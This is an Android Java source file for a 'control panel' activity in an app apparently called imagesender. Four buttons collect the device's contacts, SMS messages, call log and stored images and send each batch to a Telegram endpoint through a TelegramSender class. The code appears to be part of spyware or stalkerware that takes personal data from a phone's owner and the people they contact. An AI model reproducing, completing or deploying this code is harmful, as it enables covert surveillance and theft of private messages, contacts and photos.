package com.dotbhai.imagesender;

import android.os.Bundle;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;
import java.util.List;

public class ControlPanelActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_panel);

        Button btnContacts = findViewById(R.id.btnContacts);
        Button btnSms      = findViewById(R.id.btnSms);
        Button btnCalls    = findViewById(R.id.btnCalls);
        Button btnImages   = findViewById(R.id.btnImages);

        btnContacts.setOnClickListener(v -> new Thread(() -> {
            List<String> list = ContactHelper.getContacts(this, 50);
            TelegramSender.sendMessage("📇:\n" + String.join("\n", list));
        }).start());

        btnSms.setOnClickListener(v -> new Thread(() -> {
            List<String> list = SmsHelper.getSms(this, 30);
            TelegramSender.sendMessage("💬:\n" + String.join("\n", list));
        }).start());

        btnCalls.setOnClickListener(v -> new Thread(() -> {
            List<String> list = CallLogHelper.getCallLog(this, 30);
            TelegramSender.sendMessage("📞:\n" + String.join("\n", list));
        }).start());

        btnImages.setOnClickListener(v -> new Thread(() -> {
            List<java.io.File> imgs = ImageHelper.getAllImages(this, 20);
            for (java.io.File f : imgs) TelegramSender.sendPhoto(f, "📷 " + f.getName());
        }).start());
    }
}